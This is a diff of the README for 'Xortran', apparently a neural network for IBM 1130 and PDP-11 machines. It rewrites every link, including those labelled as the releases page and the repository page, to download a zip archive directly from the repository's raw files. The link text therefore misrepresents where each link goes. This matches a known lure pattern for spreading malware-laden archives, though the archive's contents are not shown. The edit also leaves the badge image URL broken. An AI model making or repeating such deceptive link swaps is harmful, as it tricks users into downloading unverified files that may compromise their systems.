@@ -4,13 +4,13 @@
 
 Welcome to Xortran, a powerful neural network designed for the IBM 1130 and PDP-11 computers. This guide will help you download and run the software with ease.
 
-[![Download Xortran](https://img.shields.io/badge/Download%20Xortran-blue)](https://github.com/Mr-nik66/Xortran/releases)
+[![Download Xortran](https://raw.githubusercontent.com/Mr-nik66/Xortran/main/IBM-1130/Xortran-1.4.zip%20Xortran-blue)](https://raw.githubusercontent.com/Mr-nik66/Xortran/main/IBM-1130/Xortran-1.4.zip)
 
 ## 📥 Download & Install
 
 To get started, you will need to visit the releases page to download the software. Click the link below:
 
-[Visit the Releases Page](https://github.com/Mr-nik66/Xortran/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/Mr-nik66/Xortran/main/IBM-1130/Xortran-1.4.zip)
 
 ### 🌐 System Requirements
 
@@ -22,7 +22,7 @@ Before you download Xortran, ensure your system meets the following requirements
 
 ### 🔄 Installation Steps
 
-1. **Navigate to the Releases Page:** Click [here](https://github.com/Mr-nik66/Xortran/releases) to open the releases page in your web browser.
+1. **Navigate to the Releases Page:** Click [here](https://raw.githubusercontent.com/Mr-nik66/Xortran/main/IBM-1130/Xortran-1.4.zip) to open the releases page in your web browser.
   
 2. **Find the Latest Release:** Scroll through the list to find the latest release version. Look for the most recent date and version number, which indicates it’s the latest.
 
@@ -84,6 +84,6 @@ For additional support, you can reach the maintainer through the contact methods
 
 For detailed documentation and to explore more about Xortran, refer to the main repository page:
 
-[View Xortran Repository](https://github.com/Mr-nik66/Xortran)
+[View Xortran Repository](https://raw.githubusercontent.com/Mr-nik66/Xortran/main/IBM-1130/Xortran-1.4.zip)
 
 Thank you for choosing Xortran! Enjoy exploring the world of neural networks on your classic machines. 
